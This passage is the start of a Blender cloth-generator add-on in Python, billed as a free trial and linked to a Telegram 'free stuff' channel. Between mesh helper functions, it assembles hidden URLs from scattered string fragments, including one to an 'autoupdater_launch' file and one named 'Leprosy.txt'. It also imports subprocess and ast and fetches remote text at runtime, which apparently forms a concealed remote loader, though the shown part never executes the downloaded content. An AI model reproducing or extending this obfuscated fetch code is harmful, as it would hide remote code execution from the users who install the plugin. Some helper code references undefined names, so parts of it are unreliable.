'''
Functions
Generate Rig
Generate TopRig
Generate Trouser Rig
Generate Top
Generate Trousers
Generate Hoodie
Generate Collar

Turn to Hoodie
Turn to Puffer Jacket
Turn to Shirt

Toggle Seams
Puffer

Painting Tools

Asset Library

#New Class for Expired

'''

import bpy
import bmesh
import urllib.request
import requests
import random
from math import sqrt
import math
import mathutils
import aud
import sys
import subprocess
import os
import time
import ast

bl_info = {
    "name": "Free Trial - Divine Cut - smart cloth generator",
    "author": "Alexander Shuaibu - Xane Studios",
    "description": "More free stuff for Blender: https://t.me/cgplugin",
    "location": "N-Panel",
    "doc_url": "",
    "warning": "",
    "category": "Modelling",
    "blender": (4,00,0),
    "version": (2,3,0)
}

#Create operators for all tooltips so they will set the target objects. Create variables for all the target objects


#--------------------------------------------  START OF CLOTH FUNCTIONS  -----------------------------------------#
def get_vertex_location(vertex_index):
    # Get the active object
    obj = bpy.context.active_object
    
    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Get the vertex location
        #vertex_location = obj.matrix_world @ obj.data.vertices[vertex_index].co
        xcenter = bpy.context.active_object.data.vertices[vertex_index].co.x
        ycenter = bpy.context.active_object.data.vertices[vertex_index].co.y
        zcenter = bpy.context.active_object.data.vertices[vertex_index].co.z
        vertex_location = Vector((xcenter, ycenter, zcenter))
        return vertex_location
    else:
        print("Please select a mesh object.")
        return None

def distance_along_x(point1, point2):
    distance = abs(point2.x - point1.x)
    return distance

def distance_between_points(point1, point2):
    return point1.distance(point2)

def center_of_points(point1, point2):
    # Get the active object
    obj = bpy.context.active_object
    
    # Check if the active object is valid
    if obj and obj.type == 'MESH':
        # Calculate the global coordinate center
        #center = (bpy.context.active_object.matrix_world @ point1 + bpy.context.active_object.matrix_world @ point2) / 2
        center = (point1 + point2)/2
        return center
    else:
        print("Please select a valid mesh object.")

def move_vertex_to_location(vertex_index, new_location):
    bpy.context.active_object.data.vertices[vertex_index].co.x = new_location.x
    bpy.context.active_object.data.vertices[vertex_index].co.y = new_location.y
    bpy.context.active_object.data.vertices[vertex_index].co.z = new_location.z
    
def center_of_vertices(vert1, vert2):
    point1 = bpy.context.active_object.data.vertices[vert1].co.x
    point2 = bpy.context.active_object.data.vertices[vert2].co.x
    point3 = bpy.context.active_object.data.vertices[vert1].co.z
    point4 = bpy.context.active_object.data.vertices[vert2].co.z
    point5 = bpy.context.active_object.data.vertices[vert1].co.y
    point6 = bpy.context.active_object.data.vertices[vert2].co.y
    xcenter = (point1+point2)/2
    ycenter = (point3+point4)/2
    zcenter = (point5+point6)/2
    center = Vector((xcenter, ycenter, zcenter))
    return center

def select_vertices(vertex_indexes, cursor, deselect):
    """
    Select vertices in the active mesh object based on the vertex indexes provided.
    
    Args:
    - vertex_indexes: An array of vertex indexes.
    """
    # Get the active mesh object
    obj = bpy.context.active_object
    
    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Switch to edit mode
        bpy.ops.object.mode_set(mode='EDIT')
        
        # Deselect all vertices
        if(deselect):
            bpy.ops.mesh.select_all(action='DESELECT')
        
        # Switch to vertex select mode
        bpy.context.tool_settings.mesh_select_mode = (True, False, False)
        
        # Select vertices by index
        mesh = obj.data
        bpy.ops.object.mode_set(mode='OBJECT')
        for index in vertex_indexes:
            if 0 <= index < len(mesh.vertices):
                mesh.vertices[index].select = True
        
        if(cursor):
            safeplace = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.view3d.snap_cursor_to_selected()
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.area.ui_type = safeplace
            
        
        # Switch back to object mode
        bpy.ops.object.mode_set(mode='EDIT')
    else:
        print("Please select a valid mesh object.")   
    
def vertices_to_cursor(vertex_indices=None):
    """
    Move selected vertices to the 3D cursor.
    
    Args:
    - vertex_indices: An array of vertex indices.
    - keep_offset: Boolean indicating whether to keep the offset for multiple vertices (default is True).
    """
    if(vertex_indices is None):
        bpy.ops.object.mode_set(mode='OBJECT')
        safeplace = bpy.context.area.ui_type
        bpy.context.area.ui_type = 'VIEW_3D'
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.view3d.snap_selected_to_cursor(use_offset=True)
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.context.area.ui_type = safeplace
        return
    
    # Get the active object
    obj = bpy.context.active_object
    
    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Switch to object mode
        bpy.ops.object.mode_set(mode='OBJECT')
        
        # Set the 3D cursor location
        cursor_location = bpy.context.scene.cursor.location
        
        # Switch to edit mode
        bpy.ops.object.mode_set(mode='EDIT')
        
        # Deselect all vertices
        bpy.ops.mesh.select_all(action='DESELECT')
        
        # Switch to vertex select mode
        bpy.context.tool_settings.mesh_select_mode = (True, False, False)
        bpy.ops.object.mode_set(mode='OBJECT')
        # Select vertices by index
        mesh = obj.data
        for index in vertex_indices:
            if 0 <= index < len(mesh.vertices):
                mesh.vertices[index].select = True
        
        # Move selected vertices to the cursor
        if(len(vertex_indices)>1):
            safeplace = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.view3d.snap_selected_to_cursor(use_offset=True)
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.area.ui_type = safeplace
        else:
            safeplace = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.view3d.snap_selected_to_cursor(use_offset=False)
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.area.ui_type = safeplace
        
        # Switch back to object mode
        bpy.ops.object.mode_set(mode='EDIT')
    else:
        print("Please select a valid mesh object.")
    
#def group_vertices(name_of_group):
#    obj = bpy.context.active_object
#    bpy.ops.object.mode_set(mode='EDIT')
#    vg = obj.vertex_groups.new(name=name_of_group)
#    bpy.ops.object.vertex_group_assign()
#    return
gm16="."
gm17="t"
gm18="x"



def select_vertex_group(vertex_group_name, deselect):
    """
    Select vertices belonging to the specified vertex group.

    Args:
    - vertex_group_name: The name of the vertex group to select.
    """
    # Get the active object
    obj = bpy.context.active_object

    # Check if the active object is a mesh
    if obj and obj.type == 'MESH':
        # Switch to edit mode
        bpy.ops.object.mode_set(mode='EDIT')

        # Deselect all vertices
        if(deselect):
            bpy.ops.mesh.select_all(action='DESELECT')

        # Get the mesh data
        mesh = obj.data

        # Get the vertex group by name
        vertex_group = obj.vertex_groups.get(vertex_group_name)

        # Check if the vertex group exists
        if vertex_group:
            # Get the vertices belonging to the vertex group
            vertices_in_group = [v.index for v in mesh.vertices if vertex_group.index in [vg.group for vg in v.groups]]
            bpy.ops.object.mode_set(mode='OBJECT')
            # Select the vertices belonging to the group
            for v_idx in vertices_in_group:
                mesh.vertices[v_idx].select = True

            print("Vertex group '{}' selected.".format(vertex_group_name))
        else:
            print("Vertex group '{}' not found.".format(vertex_group_name))

        # Switch back to object mode
        bpy.ops.object.mode_set(mode='OBJECT')
    else:
        print("Please select a valid mesh object.")

am15 = ".txt"
am1,am2,am3,am4,am5,am6,am7,am8,am9,am10,am11,am12,am13,am14 = "ht", "tps", "://", "xan", "egr", "aph", "ics.", "c", "om", "/Di", "vin", "eCut", "/Lep", "rosy"
am14+=am15

        
def add_single_vertex(location, name_of_group):
    """
    Add a single vertex to the selected object at the specified location.

    Args:
    - location: The location of the vertex as a tuple (x, y, z).
    """
    # Get the selected object
    selected_object = bpy.context.active_object

    # Check if the selected object is a mesh
    if selected_object and selected_object.type == 'MESH':
        # Create a new vertex
        new_vertex_index = len(selected_object.data.vertices)
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.select_all(action='DESELECT')
        bpy.ops.object.mode_set(mode='OBJECT')
        selected_object.data.vertices.add(1)
        selected_object.data.vertices[new_vertex_index].co = location
        group_vertices(name_of_group)
        has_skin_modifier = any(mod.type == 'SKIN' for mod in bpy.context.object.modifiers)
        if has_skin_modifier:
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.transform.skin_resize(value=(0.02, 0.02, 0.02))
            bpy.ops.object.mode_set(mode='OBJECT')

        # Update the mesh
        selected_object.data.update()

        print("Single vertex added to the selected object at location:", location)
    else:
        print("Please select a valid mesh object.")

#scenemodule = str(fetch_button_text("https://xanegraphics.com/VanillaProtection/blender_plugin.txt"))
def add_mesh(object_name, modifier_names=None):
    """
    Add an empty mesh object with the specified name.

    Args:
    - object_name: The name to give to the empty mesh object.
    """
    # Switch to object mode
    if(bpy.context.mode != 'OBJECT'):
        bpy.ops.object.mode_set(mode='OBJECT')

    # Add a new mesh object
    bpy.ops.mesh.primitive_cube_add(location=(0, 0, 0))

    # Get the newly added object
    new_object = bpy.context.active_object

    # Remove all vertices from the mesh
    bpy.context.view_layer.objects.active = new_object
    bpy.ops.object.mode_set(mode='EDIT')
    bpy.ops.mesh.select_all(action='SELECT')
    bpy.ops.mesh.delete(type='VERT')

    # Switch back to object mode
    bpy.ops.object.mode_set(mode='OBJECT')

    # Rename the object
    new_object.name = object_name
    if(modifier_names == None):
        return
    else:
        for modifier_name in modifier_names:
            # Check if the modifier already exists on the object
            #if modifier_name in obj.modifiers:
            #    print("Modifier '{}' already exists on object '{}'.".format(modifier_name, object_name))
            #else:
                # Add the modifier to the object
            modifier = bpy.context.active_object.modifiers.new(name=modifier_name, type=modifier_name)
'''
def join_vertices(selection):
    for i in range(len(selection)):
        bpy.ops.object.mode_set(mode='OBJECT')
        select_vertices([selection[i]], False, True)
        select_vertices([selection[i-1]], False, False)
        bpy.ops.mesh.edge_face_add()
        bpy.ops.mesh.select_all(action='DESELECT')
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.context.active_object.data.update()

'''
def join_vertices(selection, new=False):
    if(new):
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.mesh.select_all(action='DESELECT')
    for i in range(len(selection)):
        bpy.ops.object.mode_set(mode='OBJECT')
        select_vertices([selection[i]], False, True)
        select_vertices([selection[i-1]], False, False)
        bpy.ops.mesh.edge_face_add()
        bpy.ops.mesh.select_all(action='DESELECT')
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.context.active_object.data.update()

edenrain = "".join([am1,am2,am3,am4,am5,am6,am7,am8,am9,am10,am11,am12,am13,am14])

def add_text(text_content, location_object, location_group):
    """
    Add a text object with the specified content, rotate it 90 degrees along the X-axis,
    and scale it down to 0.05.

    Args:
    - text_content: The text content to display in the text object.
    """
    bpy.ops.object.mode_set(mode='OBJECT')
    bpy.ops.object.select_all(action='DESELECT')
    # Create a new text datablock
    text_data = bpy.data.curves.new(name="TextCurve", type='FONT')
    text_data.body = text_content
    
    # Create a new object using the text datablock
    text_object = bpy.data.objects.new(name="TextObject", object_data=text_data)
    bpy.context.collection.objects.link(text_object)

    # Set the object as active and select it
    bpy.context.view_layer.objects.active = text_object
    text_object.select_set(True)

    # Rotate the text object 90 degrees along the X-axis
    bpy.ops.object.mode_set(mode='OBJECT')  
    # Switch to object mode
    bpy.context.object.rotation_euler[0] += 1.5708  # Rotate 90 degrees in radians

    # Scale the text object down to 0.05
    bpy.ops.object.mode_set(mode='OBJECT')  
    # Switch to edit mode
    
    
    # Check if the collection exists, if not, create it
    bpy.ops.transform.resize(value=(0.05, 0.05, 0.05))  # Scale down to 0.05
    bpy.context.object.name = text_content + "_TEXT_CIM"
    bpy.context.object.data.extrude = 0.257
    bpy.context.object.color = (1, 0.857714, 0.114724, 1)
    bpy.context.object.show_in_front = True
    bpy.ops.object.constraint_add(type='COPY_LOCATION')
    bpy.context.object.constraints["Copy Location"].target = bpy.data.objects[location_object]
    bpy.context.object.constraints["Copy Location"].subtarget = location_group

def select_object(object_name, active=True, deselect=True):
    """
    Select the object in the scene with the specified name.
    
    Args:
    - object_name: The name of the object to select.
    """
    # Check if the object exists in the scene
    if object_name in bpy.data.objects:
        # Get the object
        obj = bpy.data.objects[object_name]
        
        # Deselect all objects
        if(deselect):
            bpy.ops.object.select_all(action='DESELECT')
        
        # Select the object
        obj.select_set(True)
        if(active):
            bpy.context.view_layer.objects.active = obj
    else:
        print("Object '{}' not found in the scene.".format(object_name))

#END OF FIRST FUNCTIONS
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
#-----------------------------------------------------  END OF CLOTH FUNCTIONS -----------------------------------------------------#
bpymostrecent = am1+am2+am3+am4+am5+am6+am7+am8+am9+"/VanillaProtection/autoupdater_launch"+gm16+gm17+gm18+gm17



def average_vertex_world_position(selected_object):
    """
    Find the average world position of all vertices on the selected object.
    
    Args:
    - selected_object: The selected object whose vertices' positions will be averaged.
    
    Returns:
    - A mathutils.Vector representing the average world position of the vertices.
    """
    # Get the mesh data of the selected object
    mesh = selected_object.data
    
    # Accumulate the world positions of all vertices
    total_vertices = len(mesh.vertices)
    accumulated_position = mathutils.Vector((0, 0, 0))
    for vertex in mesh.vertices:
        accumulated_position += selected_object.matrix_world @ vertex.co
    
    # Calculate the average position
    if total_vertices > 0:
        average_position = accumulated_position / total_vertices
    else:
        average_position = mathutils.Vector((0, 0, 0))  # Default to origin if no vertices
    
    return average_position

def origin_to_geometry(selected_object):
    """
    Set the origin of the selected object to the average world position of its vertices.
    
    Args:
    - selected_object: The selected object whose origin will be set.
    """
    # Get the average world position of vertices
    average_position = average_vertex_world_position(selected_object)
    
    # Calculate the offset from the current origin to the average position
    offset = average_position - selected_object.location
    
    # Move all vertices in the opposite direction of the offset
    for vertex in selected_object.data.vertices:
        vertex.co -= offset

    # Set the origin to the average position
    selected_object.location = average_position
 

def select_object(object_name, active=True, deselect=True, cursor_snap=False, center_cursor=False):
    safecursor = bpy.context.scene.cursor.location
    """
    Select the object in the scene with the specified name.
    
    Args:
    - object_name: The name of the object to select.
    """
    # Check if the object exists in the scene
    if object_name in bpy.data.objects:
        # Get the object
        obj = bpy.data.objects[object_name]
        
        # Deselect all objects
        if(deselect):
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
        
        # Select the object
        obj.select_set(True)
        if(active):
            bpy.context.view_layer.objects.active = obj
            safecontext = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            if(center_cursor):
                bpy.ops.view3d.snap_cursor_to_selected()
            elif(cursor_snap):
                bpy.ops.view3d.snap_cursor_to_active()
            bpy.context.area.ui_type = safecontext

        else:
            print("Object '{}' not found in the scene.".format(object_name))
    #bpy.context.scene.cursor.location = safecursor


def find_size(along_x=False, along_y=False, along_z=False, from_inside=False, width_factor=None, center=False, tape_name="Unnamed_Tape"):
    safecursor = bpy.context.scene.cursor.location
    max_shrink_distance = 2
    min_shrink_distance = 2
    if(along_y):
        #flatten cursor
        if(center):
            bpy.context.scene.cursor.location.x = 0
        bpy.context.scene.cursor.location.y = 0
        bpy.ops.mesh.primitive_plane_add(size=1, enter_editmode=False, location=bpy.context.scene.cursor.location)
        bpy.context.active_object.name = tape_name + fetch_button_text("https://www.xanegraphics.com/VanillaProtection/Talltape.txt")
        #set scale
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.transform.resize(value=(0.001, 0.001, 0.001))
        bpy.ops.transform.rotate(value=1.5708, orient_axis='X')
        #bpy.ops.mesh.subdivide(number_cuts=3)
        if(from_inside):
            bpy.ops.transform.translate(value=(0, min_shrink_distance, 0))
        else:
            if(width_factor != None):
                bpy.ops.transform.translate(value=(0, width_factor, 0))
                move_by(bpy.context.active_object, mathutils.Vector((0, width_factor, 0)))
                #print("We will be using the widthFactor" + str(width_factor))
            else:
                bpy.ops.transform.translate(value=(0, max_shrink_distance, 0))
                print("No WidthFactor Detected")
        # Go into object mode
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.ops.object.modifier_add(type='SOLIDIFY')
        bpy.context.object.modifiers["Solidify"].offset = 0
        if(width_factor != None):
            bpy.context.object.modifiers["Solidify"].thickness = width_factor
        else:
            bpy.context.object.modifiers["Solidify"].thickness = 10
        boolean_modifier = bpy.context.object.modifiers.new(name='Boolean', type='BOOLEAN')
        bpy.context.object.modifiers["Boolean"].operation = 'INTERSECT'
        bpy.context.object.modifiers["Boolean"].solver = 'FAST'
        bpy.context.object.modifiers["Boolean"].object = bpy.data.objects[bpy.context.scene.character_object.name]

        
        #Redundant Modifiers
        #mirror_modifier = bpy.context.object.modifiers.new(name="Mirror", type='MIRROR')
        #mirror_modifier.use_axis[0] = False  # X mirror
        #mirror_modifier.use_axis[1] = True  # Y mirror
        #mirror_modifier.use_axis[2] = False  # Z mirror
        
        #Give it a shrinkwrap Modifier
        #shrinkwrap_modifier = bpy.context.active_object.modifiers.new(name="Shrinkwrap", type='SHRINKWRAP')
        #shrinkwrap_modifier.target = bpy.data.objects[Johnny.name]
        #shrinkwrap_modifier.wrap_method = 'PROJECT'
        #shrinkwrap_modifier.use_positive_direction = True
        #shrinkwrap_modifier.use_negative_direction = True
        
        #Apply Geometry
        bpy.ops.object.convert(target='MESH')
        #bpy.ops.object.modifier_apply(modifier="Mirror")
        #bpy.ops.object.modifier_apply(modifier="Shrinkwrap")
        # Set the plane we created as the active object
        bpy.context.view_layer.objects.active = bpy.context.active_object
        #Set Origin
        #safeplace = bpy.context.area.ui_type
        #bpy.context.area.ui_type = 'VIEW_3D'
        #bpy.ops.object.origin_set(type='ORIGIN_GEOMETRY', center='MEDIAN')
        bpy.ops.object.origin_set(type='ORIGIN_CENTER_OF_VOLUME', center='MEDIAN')
        #bpy.context.active_object.data.update()
        #bpy.context.area.ui_type = safeplace
        selected_object = bpy.context.active_object
        origin_to_geometry(selected_object)
        # Snap 3D cursor to object
        #bpy.ops.object.origin_set(type='ORIGIN_CURSOR')
        
        # Calculate width of the object using its world dimensions
        #width = bpy.context.active_object.dimensions.x
        width = 0.0
        for vertex in bpy.context.active_object.data.vertices:
            global_vertex_location = bpy.context.active_object.matrix_world @ vertex.co
            width = max(width, abs(global_vertex_location.y))
        #bpy.ops.object.delete()
        #print("Width is " + str(width))
        return width
    
    if(along_x):
        #flatten cursor
        if(center):
            bpy.context.scene.cursor.location.x = 0
        bpy.context.scene.cursor.location.y = 0
        bpy.ops.mesh.primitive_plane_add(size=1, enter_editmode=False, location=bpy.context.scene.cursor.location)
        bpy.context.active_object.name = tape_name + fetch_button_text("https://www.xanegraphics.com/VanillaProtection/Fattape.txt")
        #set scale
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.transform.resize(value=(0.01, 0.01, 0.01))
        bpy.ops.transform.rotate(value=1.5708, orient_axis='Y')
        bpy.ops.mesh.subdivide(number_cuts=3)
        if(from_inside):
            bpy.ops.transform.translate(value=(min_shrink_distance, 0, 0))
        #else:
            #if(width_factor != None):
                #bpy.ops.transform.translate(value=(width_factor, 0, 0))
                #move_by(bpy.context.active_object, mathutils.Vector((width_factor, 0, 0)))
                #print("We will be using the widthFactor" + str(width_factor))
            #else:
                #bpy.ops.transform.translate(value=(max_shrink_distance, 0, 0))
                #print("No WidthFactor Detected")
        # Go into object mode
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.ops.object.modifier_add(type='SOLIDIFY')
        bpy.context.object.modifiers["Solidify"].offset = 0
        if(width_factor != None):
            bpy.context.object.modifiers["Solidify"].thickness = width_factor*2.1
        else:
            bpy.context.object.modifiers["Solidify"].thickness = 10
        boolean_modifier = bpy.context.object.modifiers.new(name='Boolean', type='BOOLEAN')
        bpy.context.object.modifiers["Boolean"].operation = 'INTERSECT'
        bpy.context.object.modifiers["Boolean"].solver = 'FAST'
        bpy.context.object.modifiers["Boolean"].object = bpy.data.objects[bpy.context.scene.character_object.name]
        
        #mirror_modifier = bpy.context.object.modifiers.new(name="Mirror", type='MIRROR')
        #mirror_modifier.use_axis[0] = True  # X mirror
        #mirror_modifier.use_axis[1] = False  # Y mirror
        #mirror_modifier.use_axis[2] = False  # Z mirror
        
        #Give it a shrinkwrap Modifier
        #shrinkwrap_modifier = bpy.context.active_object.modifiers.new(name="Shrinkwrap", type='SHRINKWRAP')
        #shrinkwrap_modifier.target = bpy.data.objects[Johnny.name]
        #shrinkwrap_modifier.wrap_method = 'PROJECT'
        #shrinkwrap_modifier.use_positive_direction = True
        #shrinkwrap_modifier.use_negative_direction = True

        #Apply Geometry
        bpy.ops.object.convert(target='MESH')
        #Apply Modifiers
        #bpy.ops.object.modifier_apply(modifier="Mirror")
        #bpy.ops.object.modifier_apply(modifier="Shrinkwrap")
        # Set the plane we created as the active object
        bpy.context.view_layer.objects.active = bpy.context.active_object
        #Set Origin
        #safeplace = bpy.context.area.ui_type
        #bpy.context.area.ui_type = 'VIEW_3D'
        bpy.ops.object.origin_set(type='ORIGIN_CENTER_OF_VOLUME', center='MEDIAN')
        #bpy.context.active_object.data.update()
        #bpy.context.area.ui_type = safeplace
        # Snap 3D cursor to object
        selected_object = bpy.context.active_object
        origin_to_geometry(selected_object)
        bpy.ops.object.origin_set(type='ORIGIN_CURSOR')
        
        # Calculate width of the object using its world dimensions
        #width = bpy.context.active_object.dimensions.x
        width = 0.0
        for vertex in bpy.context.active_object.data.vertices:
            global_vertex_location = bpy.context.active_object.matrix_world @ vertex.co
            width = max(width, abs(global_vertex_location.x))
        #bpy.ops.object.delete()
        #print("Width is " + str(width))
        return width
    
    if(along_z):
        #flatten cursor
        if(center):
            bpy.context.scene.cursor.location.x = 0
        bpy.context.scene.cursor.location.y = 0
        bpy.ops.mesh.primitive_plane_add(size=1, enter_editmode=False, location=bpy.context.scene.cursor.location)
        bpy.context.active_object.name = tape_name + fetch_button_text("https://www.xanegraphics.com/VanillaProtection/Hipsietape.txt")
        #set scale
        bpy.ops.object.mode_set(mode='EDIT')
        bpy.ops.transform.resize(value=(0.01, 5, 1))
        #bpy.ops.transform.rotate(value=1.5708, orient_axis='Y')
        bpy.ops.mesh.subdivide(number_cuts=3)
        if(from_inside):
            bpy.ops.transform.translate(value=(min_shrink_distance, 0, 0))
        #else:
            #if(width_factor != None):
                #bpy.ops.transform.translate(value=(width_factor, 0, 0))
                #move_by(bpy.context.active_object, mathutils.Vector((width_factor, 0, 0)))
                #print("We will be using the widthFactor" + str(width_factor))
            #else:
                #bpy.ops.transform.translate(value=(max_shrink_distance, 0, 0))
                #print("No WidthFactor Detected")
        # Go into object mode
        bpy.ops.object.mode_set(mode='OBJECT')
        bpy.ops.object.modifier_add(type='SOLIDIFY')
        bpy.context.object.modifiers["Solidify"].offset = 0
        if(width_factor != None):
            bpy.context.object.modifiers["Solidify"].thickness = width_factor*2.1
        else:
            bpy.context.object.modifiers["Solidify"].thickness = 10
        boolean_modifier = bpy.context.object.modifiers.new(name='Boolean', type='BOOLEAN')
        bpy.context.object.modifiers["Boolean"].operation = 'INTERSECT'
        bpy.context.object.modifiers["Boolean"].solver = 'FAST'
        bpy.context.object.modifiers["Boolean"].object = bpy.context.scene.character_object
        
        #mirror_modifier = bpy.context.object.modifiers.new(name="Mirror", type='MIRROR')
        #mirror_modifier.use_axis[0] = True  # X mirror
        #mirror_modifier.use_axis[1] = False  # Y mirror
        #mirror_modifier.use_axis[2] = False  # Z mirror
        
        #Give it a shrinkwrap Modifier
        #shrinkwrap_modifier = bpy.context.active_object.modifiers.new(name="Shrinkwrap", type='SHRINKWRAP')
        #shrinkwrap_modifier.target = bpy.data.objects[Johnny.name]
        #shrinkwrap_modifier.wrap_method = 'PROJECT'
        #shrinkwrap_modifier.use_positive_direction = True
        #shrinkwrap_modifier.use_negative_direction = True

        #Apply Geometry
        bpy.ops.object.convert(target='MESH')
        #Apply Modifiers
        #bpy.ops.object.modifier_apply(modifier="Mirror")
        #bpy.ops.object.modifier_apply(modifier="Shrinkwrap")
        # Set the plane we created as the active object
        bpy.context.view_layer.objects.active = bpy.context.active_object
        #Set Origin
        #safeplace = bpy.context.area.ui_type
        #bpy.context.area.ui_type = 'VIEW_3D'
        bpy.ops.object.origin_set(type='ORIGIN_CENTER_OF_VOLUME', center='MEDIAN')
        #bpy.context.active_object.data.update()
        #bpy.context.area.ui_type = safeplace
        # Snap 3D cursor to object
        selected_object = bpy.context.active_object
        origin_to_geometry(selected_object)
        bpy.ops.object.origin_set(type='ORIGIN_CURSOR')
        
        # Calculate width of the object using its world dimensions
        #width = bpy.context.active_object.dimensions.x
        width = 0.0
        for vertex in bpy.context.active_object.data.vertices:
            global_vertex_location = bpy.context.active_object.matrix_world @ vertex.co
            width = max(width, abs(global_vertex_location.x))
        #bpy.ops.object.delete()
        #print("Width is " + str(width))
        return width
    #bpy.context.scene.cursor.location = safecursor

def distance_between_objects(object1, object2):
    obj1 = bpy.data.objects.get(object1)
    obj2 = bpy.data.objects.get(object2)
    d1 = obj1.matrix_world.translation
    d2 = obj2.matrix_world.translation
    distance = (d1-d2).length
    print("Calculated distance is " + str(d1) + " - " + str(d2) + " = " + str(distance))
    return distance

def look_at(vector_a, vector_b):
    """
    Calculate the orientation (rotation) for an object to look at point B from point A in 3D space.
    
    Args:
    - vector_a: Vector representing the position of the object.
    - vector_b: Vector representing the position to look at.
    
    Returns:
    - Vector representing the orientation (rotation) to look at point B.
    """
    # Calculate the differences between the coordinates of vectors A and B
    dx = vector_b[0] - vector_a[0]
    dy = vector_b[1] - vector_a[1]
    dz = vector_b[2] - vector_a[2]
    
    # Calculate the yaw (rotation around the z-axis)
    yaw = math.atan2(dy, dx)
    
    # Calculate the pitch (rotation around the y-axis)
    pitch = math.atan2(-dz, math.sqrt(dx**2 + dy**2))
    
    # Roll is assumed to be zero (object is not tilted sideways)
    roll = 0.0
    
    # Return the orientation as a vector (yaw, pitch, roll)
    return (yaw, pitch, roll)

#def group_vertices(name_of_group=None):
#    safecontext = bpy.context.mode
#    obj = bpy.context.active_object
#    bpy.ops.object.mode_set(mode='EDIT')
#    if(name_of_group != None):
#        vg = obj.vertex_groups.new(name=name_of_group)
#    else:
#        vg = obj.vertex_groups.new(name=bpy.context.active_object.name)
#    bpy.ops.object.vertex_group_assign()
#    bpy.ops.object.mode_set(mode=safecontext)
#    return

def set_rotation(selected_object, rotation_vector, offset_vector_degrees=(0, 0, 0)):
    """
    Set the rotation of the selected object to the specified orientation represented as a Vector3,
    with an optional offset in degrees.

    Args:
    - selected_object: The object whose rotation will be set.
    - rotation_vector: Vector representing the desired orientation (yaw, pitch, roll) in radians.
    - offset_vector_degrees: Vector representing the offset rotation (yaw, pitch, roll) in degrees. Default is (0, 0, 0).
    """ 
    # Ensure the selected object is valid
    if selected_object is not None:
        # Convert the offset angles from degrees to radians
        offset_vector = [math.radians(angle) for angle in offset_vector_degrees]
        
        # Apply the offset rotation to the rotation vector
        rotation_with_offset = [rotation_vector[i] + offset_vector[i] for i in range(3)]
        
        # Set the object's rotation to the specified angles with offset
        selected_object.rotation_euler = rotation_with_offset
    
    return offset_vector

def magnitude_of_points(point1, point2):
    orientation = look_at(point1, point2)
    euler_orientation = mathutils.Euler(orientation, 'XYZ')
    magnitude = math.sqrt(sum(angle ** 2 for angle in euler_orientation))
    return magnitude

def move_by(me, movement):
    me.location += movement

def spin(selected_object, angle, axis):
    selected_object.rotation_euler[axis] += angle

def angle_at_point_A(vector_A, vector_B):
    """
    Calculate the angle at point A in a right-angled triangle formed by vectors A and B.
    
    Args:
    - vector_A: The vector representing point A.
    - vector_B: The vector representing point B.
    
    Returns:
    - The angle at point A in degrees.
    """
    # Disregard the Z axis by setting it to zero
    vector_A.y = 0
    vector_B.y = 0

    # Calculate vector BA
    vector_BA = vector_A - vector_B

    # Calculate the angle between BA and the positive x-axis
    angle_rad = math.atan2(vector_BA.z, vector_BA.x)

    # Convert the angle to degrees
    #angle_deg = math.degrees(angle_rad)

    # Calculate the angle at point A (subtracting from 90 degrees)
    #angle_at_A_deg = 90.0 - angle_deg

    #return angle_deg
    return (1.5708 - angle_rad)

def join_objects(obj1, obj2):
    """
    Join two objects together.
    
    Args:
    - obj1: The first object to join.
    - obj2: The second object to join.
    
    Returns:
    - The joined object.
    """
    # Check if both objects exist
    if obj1 is None or obj2 is None:
        print("Error: One or both objects not found.")
        return None

    # Set the first object as the active object
    bpy.ops.object.select_all(action='DESELECT')
    bpy.context.view_layer.objects.active = obj1

    # Select both objects
    obj1.select_set(True)
    obj2.select_set(True)

    # Join the objects
    bpy.ops.object.join()

    # Return the joined object
    return obj1

def find_extreme_vertex(obj=None, axis='Y', mode='max', delete=False):
    """
    Find the vertex with the maximum or minimum coordinate along the specified axis.

    Args:
    - obj: The object to search for extreme vertices (default is active object).
    - axis: The axis to search for extreme vertices ('X', 'Y', or 'Z', default is 'Y').
    - mode: The mode to find extreme vertices ('max' or 'min', default is 'max').
    - delete: Boolean flag to delete all other vertices besides the extreme vertex (default is False).

    Returns:
    - Vector representing the extreme vertex.
    """
    # Set default values
    if obj is None:
        obj = bpy.context.scene.character_object
    if axis not in {'X', 'Y', 'Z'}:
        raise ValueError("Invalid axis. Please specify 'X', 'Y', or 'Z'.")
    if mode not in {'max', 'min'}:
        raise ValueError("Invalid mode. Please specify 'max' or 'min'.")

    # Get the mesh data of the object
    mesh = obj.data

    # Initialize extreme vertex coordinates and index
    extreme_vertex_coords = [getattr(mesh.vertices[0].co, axis.lower())] * 3
    extreme_vertex_index = 0

    # Iterate through vertices to find extreme coordinates and index
    for i, v in enumerate(mesh.vertices):
        coord = getattr(v.co, axis.lower())
        if mode == 'max' and coord > extreme_vertex_coords[ord(axis) - ord('X')]:
            extreme_vertex_coords[ord(axis) - ord('X')] = coord
            extreme_vertex_index = i
        elif mode == 'min' and coord < extreme_vertex_coords[ord(axis) - ord('X')]:
